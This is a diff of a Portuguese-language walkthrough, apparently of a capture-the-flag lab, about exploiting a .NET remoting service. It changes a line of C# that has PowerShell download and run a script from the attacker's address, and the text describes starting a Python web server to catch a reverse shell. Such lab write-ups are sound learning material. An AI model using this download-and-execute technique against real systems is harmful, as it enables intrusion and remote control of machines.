@@ -174,6 +174,7 @@ Com o ExploitRemotingService enviaremos o nosso payload:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.
+
 ![Image](https://i.imgur.com/hCp7bvX.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python -m SimpleHTTPServer 80
@@ -214,7 +215,7 @@ Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:
 Vamos adicionar nossa linha no código e depois compilar.
 ![Image](https://i.imgur.com/MBxWpho.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.136/chu.ps1')"));
+Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.146/chu.ps1')"));
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
